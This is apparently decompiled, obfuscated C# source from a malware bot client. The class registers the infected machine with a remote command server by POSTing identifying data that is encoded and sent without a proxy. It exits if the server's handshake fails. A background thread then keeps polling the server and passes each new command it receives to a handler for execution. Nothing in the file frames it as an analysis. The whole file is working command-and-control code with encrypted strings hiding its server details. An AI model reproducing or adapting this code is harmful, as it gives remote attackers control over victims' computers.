using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using ns3;

namespace ns0;

internal class Class10 : Class9
{
	private static bool bool_0 = false;

	private static string string_0 = string.Empty;

	private static string string_1 = ZC.smethod_4();

	private static Thread thread_0 = new Thread(smethod_5);

	public static void smethod_1()
	{
		string_0 = string.Empty;
		smethod_4();
		smethod_2();
	}

	public static void smethod_2()
	{
		bool_0 = true;
		thread_0.Start();
	}

	public static void smethod_3()
	{
		bool_0 = false;
	}

	private static void smethod_4()
	{
		string string_ = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_32() + Class2.uI + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_33() + string_1 + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.gJ() + Class2.ushort_0 + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_34() + Class12.smethod_9();
		while (true)
		{
			try
			{
				string text = smethod_6(Class2.string_0, string_);
				if (text.Length > 0)
				{
					if (!(text != Class2.string_1))
					{
						break;
					}
					Environment.Exit(0);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.int_0 * 1000);
		}
	}

	private static void smethod_5()
	{
		string text = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_35() + Class2.uI + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_34();
		while (bool_0)
		{
			try
			{
				string text2 = smethod_6(Class2.string_0, text + Class12.smethod_9());
				if (text2.Length > 0)
				{
					if (text2 != string_0)
					{
						string_0 = text2;
						Class9.smethod_0(text2);
					}
				}
				else
				{
					Class7.smethod_7();
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class2.int_0 * 1000);
		}
	}

	private static string smethod_6(string string_2, string string_3)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		ServicePointManager.set_Expect100Continue(false);
		Class12.smethod_4(ref string_3, Class2.string_1);
		byte[] bytes = Encoding.Default.GetBytes(string_3);
		HttpWebRequest val = (HttpWebRequest)WebRequest.Create(string_2);
		((WebRequest)val).set_ContentType(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_36());
		((WebRequest)val).set_Method(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_37());
		((WebRequest)val).set_Proxy((IWebProxy)null);
		((WebRequest)val).set_ContentLength((long)bytes.Length);
		using (Stream stream = ((WebRequest)val).GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
		}
		WebResponse response = ((WebRequest)val).GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		string result = new StreamReader(response.GetResponseStream(), Encoding.Default, detectEncodingFromByteOrderMarks: false).ReadToEnd();
		Class12.smethod_4(ref result, Class2.string_1);
		return result;
	}
}
